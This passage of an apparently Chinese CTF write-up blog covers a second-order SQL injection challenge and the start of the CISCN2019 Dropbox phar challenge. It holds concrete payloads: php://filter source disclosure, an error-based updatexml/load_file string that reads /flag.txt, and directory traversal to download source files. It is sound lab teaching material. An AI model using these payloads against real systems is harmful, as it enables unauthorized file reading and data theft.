class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;no way!&#x27;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>    <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//?file=php://filter/convert.base64-encode/resource=search.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>; <br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;<br>    <span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>];<br>    <span class="hljs-variable">$phone</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$user_name</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$phone</span>))&#123; <br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;no sql inject!&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `user` where `user_name`=&#x27;<span class="hljs-subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="hljs-subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$fetch</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fetch</span>) &amp;&amp; <span class="hljs-variable">$fetch</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$fetch</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$row</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;&lt;p&gt;姓名:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user_name&#x27;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;phone&#x27;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;address&#x27;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;未找到订单!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;信息不全&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//?file=php://filter/convert.base64-encode/resource=change.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;address&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;<br>    <span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>];<br>    <span class="hljs-variable">$address</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;address&quot;</span>]);<br>    <span class="hljs-variable">$phone</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$user_name</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$phone</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;no sql inject!&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `user` where `user_name`=&#x27;<span class="hljs-subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="hljs-subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$fetch</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fetch</span>) &amp;&amp; <span class="hljs-variable">$fetch</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$fetch</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="hljs-variable">$address</span>.<span class="hljs-string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;address&#x27;</span>].<span class="hljs-string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>];<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;订单修改成功&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;未找到订单!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;信息不全&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//?file=php://filter/convert.base64-encode/resource=delete.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;<br>    <span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>];<br>    <span class="hljs-variable">$phone</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$user_name</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$phone</span>))&#123; <br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;no sql inject!&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `user` where `user_name`=&#x27;<span class="hljs-subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="hljs-subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$fetch</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fetch</span>) &amp;&amp; <span class="hljs-variable">$fetch</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$fetch</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;user_id&quot;</span>]);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;订单删除成功&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;未找到订单!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;信息不全&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">///?file=php://filter/convert.base64-encode/resource=config.php</span><br>?php<br><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>, <span class="hljs-title function_ invoke__">getcwd</span>() . <span class="hljs-string">&quot;:/etc:/tmp&quot;</span>);<br><br><span class="hljs-variable">$DATABASE</span> = <span class="hljs-keyword">array</span>(<br><br>    <span class="hljs-string">&quot;host&quot;</span> =&gt; <span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>    <span class="hljs-string">&quot;username&quot;</span> =&gt; <span class="hljs-string">&quot;root&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span> =&gt; <span class="hljs-string">&quot;root&quot;</span>,<br>    <span class="hljs-string">&quot;dbname&quot;</span> =&gt;<span class="hljs-string">&quot;ctfusers&quot;</span><br>);<br><br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$DATABASE</span>[<span class="hljs-string">&#x27;host&#x27;</span>],<span class="hljs-variable">$DATABASE</span>[<span class="hljs-string">&#x27;username&#x27;</span>],<span class="hljs-variable">$DATABASE</span>[<span class="hljs-string">&#x27;password&#x27;</span>],<span class="hljs-variable">$DATABASE</span>[<span class="hljs-string">&#x27;dbname&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>可以看到对用户名和电话过滤很严格而且开了<code>/i</code>模式。但对地址只进行了简单的转义处理：</p><p><code>$address = addslashes($_POST[&quot;address&quot;]);</code></p><p>二次注入，参考<code>https://www.cnblogs.com/Article-kelp/p/16052105.html</code></p><p>之前对于转义这个东西理解还不太好，网上找了篇文章：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs mysql">//下面的SELECT语句显示了引用和转义如何工作：<br><br>mysql&gt; SELECT &#x27;hello&#x27;, &#x27;&quot;hello&quot;&#x27;, &#x27;&quot;&quot;hello&quot;&quot;&#x27;, &#x27;hel&#x27;&#x27;lo&#x27;, &#x27;\&#x27;hello&#x27;;<br><br>+-------+---------+-----------+--------+--------+<br><br>| hello | &quot;hello&quot; | &quot;&quot;hello&quot;&quot; | hel&#x27;lo | &#x27;hello |<br><br>+-------+---------+-----------+--------+--------+<br><br> <br><br>mysql&gt; SELECT &quot;hello&quot;, &quot;&#x27;hello&#x27;&quot;, &quot;&#x27;&#x27;hello&#x27;&#x27;&quot;, &quot;hel&quot;&quot;lo&quot;, &quot;\&quot;hello&quot;;<br><br>+-------+---------+-----------+--------+--------+<br><br>| hello | &#x27;hello&#x27; | &#x27;&#x27;hello&#x27;&#x27; | hel&quot;lo | &quot;hello |<br><br>+-------+---------+-----------+--------+--------+<br><br><br>//https://www.cnblogs.com/end/archive/2011/04/01/2002516.html<br></code></pre></td></tr></table></figure><p>个人理解就是经过转义<code>(增加\)</code>，一些特殊字符<code>(比如&#39;)</code>这东西就失去了它本身的含义，变成了某个字符串的一部分。在上面的例子我们也能知道，增加转义符后不是说我输入的数据也增加了个字符。</p><p>主要是这里存在问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//change.php</span><br><span class="hljs-variable">$address</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;address&quot;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="hljs-variable">$address</span>.<span class="hljs-string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;address&#x27;</span>].<span class="hljs-string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<span class="hljs-comment">//这里我们可以用报错注入</span><br></code></pre></td></tr></table></figure><p>在注册用户的地址时时，我们可以构造恶意的<code>SQL</code>语句<code>(经过转义后被放到数据库中，等着我们在修改地址时触发)</code>。然后我们修改地址，触发刚刚构造的<code>sql</code>语句。</p><p>做法的话有两种，先看不利用报错直接回显的：</p><p>参考了这位师傅的解法：<code>https://www.cnblogs.com/Article-kelp/p/16052105.html</code></p><p>我们先随便注册两个账户：<code>(一个账户就行，我注册两个为了方便解释)</code></p><p>地址(别丢了反引号)：’,<code>address</code>&#x3D;database()#</p><p><img src="/img/cyberpunk7.png" alt="cyberpunk7"></p><p><img src="/img/cyber9.png" alt="cyber9"></p><p>在修改地址时，<code>SQL</code>语句变成了：</p><p>$sql &#x3D; “update <code>user</code> set <code>address</code>&#x3D;’”.$address.”‘, <code>old_address</code>&#x3D;’’,<code>address</code>&#x3D;’database()’# 这后面的都没了”‘ where <code>user_id</code>&#x3D;”.$row[‘user_id’];</p><p>旧地址为空，新地址被设置成数据库名。</p><p>但要注意由于没有限制<code>user_id</code>，所以<code>user</code>表中所有用户的地址都是数据库名。</p><p>现在我们把<code>1</code>的地址改成<code>1</code>:</p><p><img src="/img/cyberpunk8.png" alt="cyberpunk8"></p><p>提交后查询：</p><p><img src="/img/cyber10.png" alt="cyber10"></p><p>可以看到地址的名字已经是库名了，现在我们在看看<code>2</code>的地址：</p><p><img src="/img/cyber11.png" alt="cyber11"></p><p>我们并没有更改<code>2</code>的地址但也回显了<code>ctfusers</code>，其实就是刚才在修改时把<code>user</code>表中所有<code>address</code>字段的值都设置了。</p><p>后面就简单了，爆库爆表爆列爆字段，不过这题官方当时是给了hint的，就是<code>flag</code>在<code>flag.txt</code>中，我们用<code>load_file</code>直接读<code>/flag.txt</code>中的内容：</p><p><img src="/img/cyber12.png" alt="cyber12"></p><p><img src="/img/cyber13.png" alt="cyber13"></p><p>第二种方法就是网上很多人用的，利用报错进行回显：</p><p><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)#</code></p><p>注册的时候就输入<code>payload</code>，然后随便修改一个对应的地址：</p><p><img src="/img/cyber14.png" alt="cyber14"></p><p>查询订单订单时候查出来的其实就是我们的输入，不过因为被转义了所以没啥影响：</p><p><img src="/img/cyber16.png" alt="cyber16"></p><h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>提示<code>php phar</code></p><p><img src="/img/dropbox1.png" alt="dropbox1"></p><p>先注册一个登录看看</p><p>上传功能，不过是否有过滤不清楚，我们先上传一个图片文件(只允许上传图片形式的):</p><p><img src="/img/dropbox4.png" alt="dropbox4"></p><p>上传后提供了下载功能，抓包看一下：</p><p><img src="/img/dropbox3.png" alt="dropbox3"></p><p>其实如果做这种<code>phar</code>的题最好能拿到源码，尝试下载<code>upload.php</code>看看：</p><p>(利用目录穿越多试几次)</p><p><img src="/img/dropbox6.png" alt="dropbox6"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//upload.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span 